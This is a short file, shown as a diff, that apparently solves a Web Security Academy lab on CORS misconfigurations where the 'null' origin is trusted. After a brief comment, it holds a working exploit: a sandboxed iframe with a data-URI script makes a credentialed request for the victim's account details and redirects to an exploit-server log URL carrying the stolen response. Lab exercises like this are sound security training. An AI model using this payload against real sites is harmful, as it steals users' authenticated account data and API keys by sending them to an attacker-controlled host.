@@ -1,0 +1,17 @@
+# Take advantage of a CORS Misconfigured Access-Control-Allow-Origin header that is whitelisted for "null" applications. This can be a misconfiguration issue due to
+# internal teams using the "null" domain during development.
+# This exploit code creates a sandboxed iframe element to create the request to from the victim website and log the sensitive information within the reqListener() function.
+
+
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://acc51f741fbe9489c1c80b620057009f.web-security-academy.net/accountDetails',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+location=' https://exploit-acc51f101fa29470c12d0bac0176000f.web-security-academy.net/log?key='+this.responseText;
+alert(this.responseText);
+};
+</script>"></iframe> 
